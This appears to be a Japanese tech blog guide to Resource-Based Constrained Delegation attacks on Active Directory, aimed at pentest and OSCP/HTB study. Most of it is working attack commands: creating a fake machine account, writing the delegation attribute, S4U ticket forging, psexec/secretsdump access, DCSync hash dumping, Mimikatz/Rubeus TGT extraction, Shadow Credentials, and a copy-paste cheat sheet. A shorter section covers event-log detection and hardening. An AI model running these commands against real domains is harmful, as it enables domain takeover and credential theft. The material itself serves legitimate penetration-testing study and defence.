---
title: "RBCD (Resource-Based Constrained Delegation) 攻撃ガイド"
date: 2026-03-03
description: "Kerberos 委任の悪用による権限昇格攻撃の完全ガイド。RBCD の仕組みから S4U2Self/S4U2Proxy を使った実践的な攻撃手法、検出・防御策まで解説する。"
categories: [TechBlog]
tags: [active-directory, kerberos, rbcd, delegation, privilege-escalation, windows, impacket, pentest]
mermaid: true
---


Kerberos 委任の悪用による権限昇格攻撃の完全ガイド

---

## 目次

1. [Kerberos 委任の基礎](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#kerberos-%E5%A7%94%E4%BB%BB%E3%81%AE%E5%9F%BA%E7%A4%8E)
2. [RBCD とは](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#rbcd-%E3%81%A8%E3%81%AF)
3. [RBCD 攻撃条件](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#rbcd-%E6%94%BB%E6%92%83%E6%9D%A1%E4%BB%B6)
4. [攻撃フロー（シーケンス図）](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#%E6%94%BB%E6%92%83%E3%83%95%E3%83%AD%E3%83%BC%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9%E5%9B%B3)
5. [攻撃コマンド](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#%E6%94%BB%E6%92%83%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89)
6. [実践例](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#%E5%AE%9F%E8%B7%B5%E4%BE%8B)
7. [検出と防御](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#%E6%A4%9C%E5%87%BA%E3%81%A8%E9%98%B2%E5%BE%A1)
8. [関連攻撃手法](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#%E9%96%A2%E9%80%A3%E6%94%BB%E6%92%83%E6%89%8B%E6%B3%95)

---

## Kerberos 委任の基礎

### 委任の種類

Active Directory には 3 種類の Kerberos 委任があります：

1. **Unconstrained Delegation** (無制限委任)
2. **Constrained Delegation** (制限付き委任)
3. **Resource-Based Constrained Delegation** (リソースベース制限付き委任 = RBCD)

### 委任が必要な理由

```mermaid
sequenceDiagram
    participant U as ユーザー
    participant W as Webサーバー
    participant D as DBサーバー
    participant DC as Domain Controller
    
    Note over U,D: 委任がない場合の問題
    
    U->>W: 1. Web アクセス
    W->>DC: 2. ユーザーの認証確認
    DC->>W: 3. OK
    W->>D: 4. DB アクセス試行
    Note over W,D: ❌ ユーザーの資格情報がないため<br/>DB アクセス失敗
    
    Note over U,D: 委任がある場合
    
    U->>W: 1. Web アクセス（TGT付き）
    W->>DC: 2. ユーザーになりすまして<br/>DB サービスチケット要求
    DC->>W: 3. DB サービスチケット発行
    W->>D: 4. ユーザーとして DB アクセス
    Note over W,D: ✅ 委任により成功
```

---

## RBCD とは

### 特徴

- **コンピューターアカウント側で設定**（従来の委任は委任元で設定）
- **msDS-AllowedToActOnBehalfOfOtherIdentity** 属性で制御
- Domain Admin 権限なしで設定可能（書き込み権限があれば）
- **S4U2Self** と **S4U2Proxy** を使用

### 従来の委任との違い

```mermaid
flowchart LR
    subgraph "Constrained Delegation (従来)"
        A1[Webサーバー] -->|設定| A2[委任先を<br/>Webサーバーで指定]
        A2 --> A3[DBサーバーに委任]
    end
    
    subgraph "RBCD (リソースベース)"
        B1[DBサーバー] -->|設定| B2[委任元を<br/>DBサーバーで指定]
        B2 --> B3[Webサーバーからの<br/>委任を許可]
    end
    
    style A2 fill:#ff6b6b
    style B2 fill:#4ecdc4
    
    Note1[Domain Admin権限が必要]
    Note2[GenericWrite権限で可能]
    
    A2 -.-> Note1
    B2 -.-> Note2
```

---

## RBCD 攻撃条件

### ✅ 必要な条件

1. **ターゲットコンピューターへの書き込み権限**
    
    - `GenericWrite`
    - `GenericAll`
    - `WriteProperty` (msDS-AllowedToActOnBehalfOfOtherIdentity)
    - `WriteDACL`
2. **コントロールできるコンピューターアカウント**
    
    - 新しいコンピューターアカウントを作成できる（`ms-DS-MachineAccountQuota > 0`）
    - または既存のコンピューターアカウントの制御
3. **ターゲットへのアクセス**
    
    - ターゲットが Service Principal Name (SPN) を持つ
    - ターゲットがドメインに参加している

### 攻撃可能なシナリオ例

- ユーザーが自分のコンピューターに対して `GenericAll` 権限を持つ（デフォルト設定）
- Exchange Server などの特権サービスアカウントが誤設定されている
- GPO で過剰な権限が付与されている

---

## 攻撃フロー（シーケンス図）

### 完全な攻撃シーケンス

```mermaid
sequenceDiagram
    autonumber
    participant A as 攻撃者<br/>(john)
    participant AD as Active Directory
    participant Fake as 偽コンピューター<br/>(FAKE01$)
    participant Target as ターゲット<br/>(WEB01)
    participant DC as Domain Controller
    
    Note over A,DC: フェーズ 1: 権限確認と準備
    
    A->>AD: Get-DomainComputer WEB01 の<br/>ACL を確認
    AD->>A: GenericWrite 権限あり
    
    A->>AD: Get-DomainObject<br/>ms-DS-MachineAccountQuota 確認
    AD->>A: Quota = 10<br/>(コンピューター作成可能)
    
    Note over A,DC: フェーズ 2: 偽コンピューターアカウント作成
    
    A->>AD: New-MachineAccount<br/>-MachineAccount FAKE01<br/>-Password Password123!
    AD->>Fake: FAKE01$ を作成
    Fake->>A: アカウント作成完了
    
    Note over A,DC: フェーズ 3: RBCD 設定
    
    A->>AD: WEB01 の<br/>msDS-AllowedToActOnBehalfOfOtherIdentity<br/>属性を変更
    Note over A: FAKE01$ を追加
    
    AD->>Target: RBCD 設定適用
    Note over Target: FAKE01$ からの委任を許可
    
    Note over A,DC: フェーズ 4: S4U2Self (自分のチケット取得)
    
    A->>DC: S4U2Self リクエスト<br/>From: FAKE01$<br/>For: Administrator
    Note over A: FAKE01$ として<br/>Administrator のチケットを要求
    
    DC->>DC: FAKE01$ の資格情報確認
    DC->>A: Administrator の<br/>Forwardable チケット発行
    
    Note over A,DC: フェーズ 5: S4U2Proxy (委任実行)
    
    A->>DC: S4U2Proxy リクエスト<br/>From: FAKE01$<br/>For: Administrator<br/>To: WEB01 (CIFS/HTTP/etc)
    
    DC->>DC: WEB01 の RBCD 設定確認
    Note over DC: FAKE01$ からの委任が許可されている
    
    DC->>A: WEB01 への<br/>Administrator サービスチケット発行
    
    Note over A,DC: フェーズ 6: ターゲットアクセス
    
    A->>Target: Administrator として<br/>WEB01 にアクセス<br/>(SMB/HTTP/etc)
    Target->>Target: チケット検証
    Target->>A: アクセス許可
    
    Note over A: WEB01 を完全に制御
```

### S4U 拡張の詳細

```mermaid
sequenceDiagram
    participant A as FAKE01$
    participant DC as DC
    participant T as WEB01
    
    Note over A,T: S4U2Self: 任意のユーザーの<br/>自分へのチケットを取得
    
    A->>DC: TGS-REQ (S4U2Self)<br/>sname: FAKE01$<br/>for-user: Administrator
    DC->>DC: FAKE01$ の権限確認
    DC->>A: TGS-REP<br/>Forwardable チケット
    
    Note over A: 取得したチケット:<br/>Administrator → FAKE01$
    
    Note over A,T: S4U2Proxy: 取得したチケットを<br/>別のサービスに委任
    
    A->>DC: TGS-REQ (S4U2Proxy)<br/>sname: CIFS/WEB01<br/>additional-tickets: [Administrator→FAKE01$]
    DC->>DC: WEB01 の RBCD 確認<br/>FAKE01$ が許可されている?
    DC->>A: TGS-REP<br/>Administrator → WEB01
    
    Note over A: 取得したチケット:<br/>Administrator → WEB01/CIFS
    
    A->>T: AP-REQ<br/>Administrator のチケットで認証
    T->>A: Administrator としてアクセス許可
```

---

## 攻撃コマンド

### 1. 権限の確認

**PowerView (Windows)**

```powershell
# PowerView をインポート
Import-Module .\PowerView.ps1

# ターゲットへの権限を確認
Get-DomainObjectAcl -Identity WEB01 | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser john).objectsid}

# または特定の権限を検索
Get-DomainObjectAcl -Identity WEB01 -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty"}
```

**BloodHound (推奨)**

```cypher
// BloodHound クエリ: john から制御できるコンピューター
MATCH (u:User {name:"JOHN@CORP.LOCAL"})-[r:GenericAll|GenericWrite|WriteProperty|WriteDacl]->(c:Computer)
RETURN u,r,c

// 最短攻撃パス
MATCH p=shortestPath((u:User {name:"JOHN@CORP.LOCAL"})-[*1..]->(c:Computer))
WHERE ANY(rel in relationships(p) WHERE type(rel) IN ["GenericAll","GenericWrite","WriteProperty","WriteDacl"])
RETURN p
```

**Linux (Impacket)**

```bash
# dacledit.py で権限確認
impacket-dacledit -action read -principal john -target WEB01$ corp.local/john:'Password123!' -dc-ip 10.10.10.100
```

### 2. MachineAccountQuota の確認

**PowerShell**

```powershell
# ドメイン全体の Quota 確認
Get-DomainObject -Identity "DC=corp,DC=local" -Properties ms-DS-MachineAccountQuota

# 現在作成されているコンピューター数
(Get-DomainComputer).Count
```

**Linux**

```bash
# ldapsearch で確認
ldapsearch -x -H ldap://10.10.10.100 -D "cn=john,cn=users,dc=corp,dc=local" -w 'Password123!' -b "dc=corp,dc=local" "(objectClass=domain)" ms-DS-MachineAccountQuota

# 出力例: ms-DS-MachineAccountQuota: 10
```

### 3. 偽コンピューターアカウントの作成

**Powermad (Windows)**

```powershell
# Powermad をインポート
Import-Module .\Powermad.ps1

# 新しいコンピューターアカウント作成
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# 確認
Get-DomainComputer FAKE01
```

**Impacket (Linux) - 推奨**

```bash
# addcomputer.py でコンピューター作成
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Password123!' -dc-ip 10.10.10.100 corp.local/john:'Password123!'

# 出力例:
# [*] Successfully added machine account FAKE01$ with password Password123!
```

**StandIn (Windows - オルタナティブ)**

```powershell
# StandIn でコンピューター作成
.\StandIn.exe --computer FAKE01 --make
```

### 4. RBCD の設定

**PowerView (Windows)**

```powershell
# PowerView で RBCD を設定

# FAKE01$ の SID を取得
$ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select-Object -ExpandProperty objectsid

# Security Descriptor を作成
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# WEB01 の msDS-AllowedToActOnBehalfOfOtherIdentity に設定
Set-DomainObject -Identity WEB01 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

**Impacket rbcd.py (Linux) - 推奨**

```bash
# rbcd.py で RBCD を設定
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'WEB01$' -dc-ip 10.10.10.100 -action write corp.local/john:'Password123!'

# 出力例:
# [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
# [*] Delegation rights modified successfully!
# [*] FAKE01$ can now impersonate users on WEB01$ via S4U2Proxy
```

**確認**

```bash
# 設定された RBCD を確認
impacket-rbcd -delegate-to 'WEB01$' -dc-ip 10.10.10.100 -action read corp.local/john:'Password123!'

# 出力例:
# [*] Accounts allowed to act on behalf of other identity:
# [*]     FAKE01$       (S-1-5-21-...)
```

### 5. S4U 攻撃の実行（チケット取得）

**Impacket getST.py (Linux) - 推奨**

```bash
# getST.py で Administrator のサービスチケットを取得
impacket-getST -spn cifs/web01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/FAKE01$:'Password123!'

# 出力:
# [*] Getting TGT for user
# [*] Impersonating Administrator
# [*] Requesting S4U2self
# [*] Requesting S4U2Proxy
# [*] Saving ticket in Administrator@cifs_web01.corp.local@CORP.LOCAL.ccache

# 複数のサービスを指定
impacket-getST -spn cifs/web01.corp.local -spn http/web01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/FAKE01$:'Password123!'
```

**Rubeus (Windows)**

```powershell
# Rubeus で S4U 攻撃
.\Rubeus.exe s4u /user:FAKE01$ /rc4:[FAKE01$のNTLMハッシュ] /impersonateuser:Administrator /msdsspn:cifs/web01.corp.local /ptt

# または
.\Rubeus.exe s4u /user:FAKE01$ /password:Password123! /impersonateuser:Administrator /msdsspn:cifs/web01.corp.local /ptt

# /ptt = Pass-the-Ticket (自動的にメモリに注入)
```

**NTLM ハッシュの計算**

```bash
# FAKE01$ の NTLM ハッシュを計算
python3 -c 'import hashlib; print(hashlib.new("md4", "Password123!".encode("utf-16le")).hexdigest())'

# 出力例: 32ED87BDB5FDC5E9CBA88547376818D4
```

### 6. ターゲットへのアクセス

**Linux (Impacket)**

```bash
# KRB5CCNAME 環境変数にチケットを設定
export KRB5CCNAME=Administrator@cifs_web01.corp.local@CORP.LOCAL.ccache

# SMB アクセス
impacket-smbexec -k -no-pass web01.corp.local

# または PSExec
impacket-psexec -k -no-pass Administrator@web01.corp.local

# または secretsdump
impacket-secretsdump -k -no-pass web01.corp.local

# WMI 実行
impacket-wmiexec -k -no-pass Administrator@web01.corp.local
```

**Windows**

```powershell
# チケットが /ptt でメモリに注入されている場合

# SMB アクセス
dir \\web01\c$

# PSExec
.\PsExec.exe \\web01 cmd

# WinRM
Enter-PSSession -ComputerName web01

# リモートコマンド実行
Invoke-Command -ComputerName web01 -ScriptBlock { whoami }
```

### 7. 追加の SPN でのアクセス

```bash
# HTTP サービスへのチケット取得
impacket-getST -spn http/web01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/FAKE01$:'Password123!'
export KRB5CCNAME=Administrator@http_web01.corp.local@CORP.LOCAL.ccache

# LDAP サービス
impacket-getST -spn ldap/web01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/FAKE01$:'Password123!'

# HOST サービス（複数のサービスを含む）
impacket-getST -spn host/web01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/FAKE01$:'Password123!'
```

---

## 実践例

### シナリオ 1: ユーザーが自分の PC に対する権限を持つ

多くの環境では、ユーザーは自分のコンピューターに対して `GenericAll` 権限を持ちます。

```bash
# 1. 権限確認
impacket-dacledit -action read -principal john -target JOHN-PC$ corp.local/john:'Password123!' -dc-ip 10.10.10.100
# GenericAll 権限を確認

# 2. 偽コンピューター作成
impacket-addcomputer -computer-name 'EVILPC$' -computer-pass 'EvilPass123!' -dc-ip 10.10.10.100 corp.local/john:'Password123!'

# 3. RBCD 設定
impacket-rbcd -delegate-from 'EVILPC$' -delegate-to 'JOHN-PC$' -dc-ip 10.10.10.100 -action write corp.local/john:'Password123!'

# 4. チケット取得
impacket-getST -spn cifs/john-pc.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/EVILPC$:'EvilPass123!'

# 5. アクセス
export KRB5CCNAME=Administrator@cifs_john-pc.corp.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass Administrator@john-pc.corp.local
```

### シナリオ 2: Domain Controller への昇格

DC に対して `GenericWrite` 権限を持つ場合（稀だが強力）：

```bash
# 1. DC への権限確認
impacket-dacledit -action read -principal john -target DC01$ corp.local/john:'Password123!' -dc-ip 10.10.10.100

# 2. 偽コンピューター作成
impacket-addcomputer -computer-name 'FAKEDC$' -computer-pass 'FakeDC123!' -dc-ip 10.10.10.100 corp.local/john:'Password123!'

# 3. RBCD 設定
impacket-rbcd -delegate-from 'FAKEDC$' -delegate-to 'DC01$' -dc-ip 10.10.10.100 -action write corp.local/john:'Password123!'

# 4. DCSync 用のチケット取得
impacket-getST -spn ldap/dc01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/FAKEDC$:'FakeDC123!'

# 5. DCSync 実行
export KRB5CCNAME=Administrator@ldap_dc01.corp.local@CORP.LOCAL.ccache
impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@dc01.corp.local

# Domain Admin ハッシュ取得！
```

### シナリオ 3: コンピューターアカウントを既に制御している場合

```bash
# 既にコンピューターアカウントのパスワードを知っている場合
# （例: LAPS の脆弱性、平文パスワードの発見など）

# 1. 制御しているコンピューター: COMPROMISED01$
# パスワード: CompPass123!

# 2. ターゲット: WEB01$
# 権限: COMPROMISED01$ が WEB01$ に対して GenericWrite を持つ

# 3. RBCD 設定
impacket-rbcd -delegate-from 'COMPROMISED01$' -delegate-to 'WEB01$' -dc-ip 10.10.10.100 -action write corp.local/COMPROMISED01$:'CompPass123!'

# 4. チケット取得と攻撃
impacket-getST -spn cifs/web01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/COMPROMISED01$:'CompPass123!'

export KRB5CCNAME=Administrator@cifs_web01.corp.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass Administrator@web01.corp.local
```

---

## 検出と防御

### 検出方法

**1. イベントログ監視**

```powershell
# イベント ID 4742: コンピューターアカウントの変更
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4742} | Where-Object {$_.Message -match "msDS-AllowedToActOnBehalfOfOtherIdentity"}

# イベント ID 4741: コンピューターアカウントの作成
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4741}

# イベント ID 4769: Kerberos サービスチケット要求
# S4U2Self/S4U2Proxy を検出
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} | Where-Object {$_.Message -match "Ticket Options.*0x40810000"}
```

**2. RBCD 設定の監査**

```powershell
# 全コンピューターの RBCD 設定を確認
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "msDS-AllowedToActOnBehalfOfOtherIdentity"}

# または
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}
```

**3. 新規コンピューターアカウントの監視**

```powershell
# 最近作成されたコンピューター（24時間以内）
Get-ADComputer -Filter {whenCreated -gt $((Get-Date).AddDays(-1))} -Properties whenCreated | Select-Object Name,whenCreated
```

### 防御策

**1. MachineAccountQuota を 0 に設定**

```powershell
# ドメインレベルで設定
Set-ADDomain -Identity corp.local -Replace @{"ms-DS-MachineAccountQuota"="0"}

# 確認
Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties ms-DS-MachineAccountQuota
```

**2. コンピューターアカウントへの書き込み権限を制限**

```powershell
# 不要な GenericWrite/GenericAll 権限を削除
# BloodHound で監査してから削除
```

**3. Protected Users グループの使用**

```powershell
# 特権ユーザーを Protected Users に追加
Add-ADGroupMember -Identity "Protected Users" -Members Administrator,krbtgt

# Protected Users は委任を使用できない
```

**4. RBCD 監視スクリプトの導入**

```powershell
# 定期的に RBCD 設定を監査
$computers = Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
foreach ($computer in $computers) {
    if ($computer.'msDS-AllowedToActOnBehalfOfOtherIdentity') {
        Write-Warning "$($computer.Name) has RBCD configured!"
    }
}
```

---

## 関連攻撃手法

### Unconstrained Delegation 攻撃

```mermaid
sequenceDiagram
    participant A as 攻撃者
    participant UC as Unconstrained<br/>Delegation<br/>サーバー
    participant DC as Domain Controller
    participant V as 被害者<br/>(Domain Admin)
    
    Note over UC: TrustedForDelegation = True
    
    A->>UC: サーバーを侵害
    
    Note over A: Coercion 攻撃で<br/>Domain Admin を誘導
    
    A->>V: PrinterBug /<br/>PetitPotam
    V->>UC: 認証（TGT付き）
    UC->>UC: TGT をメモリに保存
    
    A->>UC: Rubeus.exe dump
    UC->>A: Domain Admin の TGT 抽出
    
    A->>DC: TGT で認証
    DC->>A: Domain Admin アクセス
```

**攻撃コマンド**

```powershell
# Unconstrained Delegation サーバーを探す
Get-DomainComputer -Unconstrained

# TGT を抽出
.\Rubeus.exe dump

# または Mimikatz
sekurlsa::tickets /export
```

### Constrained Delegation 攻撃

```mermaid
sequenceDiagram
    participant A as 攻撃者
    participant CD as Constrained<br/>Delegation<br/>アカウント
    participant DC as Domain Controller
    participant T as ターゲット<br/>サービス
    
    Note over CD: msDS-AllowedToDelegateTo:<br/>CIFS/TARGET
    
    A->>CD: アカウントを侵害<br/>(パスワード/ハッシュ)
    
    A->>DC: S4U2Self リクエスト<br/>For: Administrator
    DC->>A: Administrator チケット
    
    A->>DC: S4U2Proxy リクエスト<br/>To: CIFS/TARGET
    DC->>A: TARGET へのチケット
    
    A->>T: Administrator として接続
```

**攻撃コマンド**

```bash
# Constrained Delegation を持つアカウントを探す
Get-DomainComputer -TrustedToAuth
Get-DomainUser -TrustedToAuth

# getST で攻撃
impacket-getST -spn cifs/target.corp.local -impersonate Administrator -hashes :NTLMHASH corp.local/serviceaccount$
```

### Shadow Credentials 攻撃

RBCD と似ているが、証明書ベース：

```bash
# pywhisker で Shadow Credentials を設定
python3 pywhisker.py -d corp.local -u john -p 'Password123!' --target WEB01$ --action add

# 証明書で認証
certipy auth -pfx web01.pfx -dc-ip 10.10.10.100
```

---

## トラブルシューティング

### エラー 1: "KDC_ERR_BADOPTION"

**原因**: ターゲットが `TrustedToAuthForDelegation` フラグを持っていない

**解決策**:

```bash
# WEB01$ が委任を受け入れるよう設定されているか確認
Get-ADComputer WEB01 -Properties TrustedToAuthForDelegation
```

### エラー 2: "KRB_AP_ERR_MODIFIED"

**原因**: チケットが無効、または時刻同期の問題

**解決策**:

```bash
# NTP で時刻同期
sudo ntpdate 10.10.10.100

# または
sudo timedatectl set-ntp true
```

### エラー 3: "STATUS_ACCESS_DENIED"

**原因**: RBCD 設定が正しくない、または SPN が存在しない

**解決策**:

```bash
# RBCD 設定を再確認
impacket-rbcd -delegate-to 'WEB01$' -action read corp.local/john:'Password123!' -dc-ip 10.10.10.100

# SPN を確認
setspn -L WEB01
```

---

## チートシート

### 完全な攻撃フロー（コピペ用）

```bash
# === 1. 権限確認 ===
impacket-dacledit -action read -principal john -target WEB01$ corp.local/john:'Password123!' -dc-ip 10.10.10.100

# === 2. 偽コンピューター作成 ===
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Password123!' -dc-ip 10.10.10.100 corp.local/john:'Password123!'

# === 3. RBCD 設定 ===
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'WEB01$' -dc-ip 10.10.10.100 -action write corp.local/john:'Password123!'

# === 4. チケット取得 ===
impacket-getST -spn cifs/web01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/FAKE01$:'Password123!'

# === 5. アクセス ===
export KRB5CCNAME=Administrator@cifs_web01.corp.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass Administrator@web01.corp.local
```

### 重要なツール

|ツール|用途|
|---|---|
|**PowerView**|権限列挙・RBCD設定 (Windows)|
|**Impacket rbcd.py**|RBCD設定 (Linux)|
|**Impacket getST.py**|S4U攻撃・チケット取得|
|**Rubeus**|S4U攻撃 (Windows)|
|**BloodHound**|攻撃パスの可視化|
|**Powermad**|コンピューターアカウント作成|

---

## まとめ

RBCD 攻撃は強力で、以下の理由から人気があります：

✅ **Domain Admin 権限不要** - GenericWrite だけで実行可能 ✅ **検出が困難** - 正規の Kerberos プロトコルを使用 ✅ **柔軟性が高い** - 任意のユーザーになりすまし可能 ✅ **永続化が可能** - RBCD 設定を残すことで再侵入が容易

OSCP や HTB では頻出の攻撃手法なので、しっかりマスターしましょう！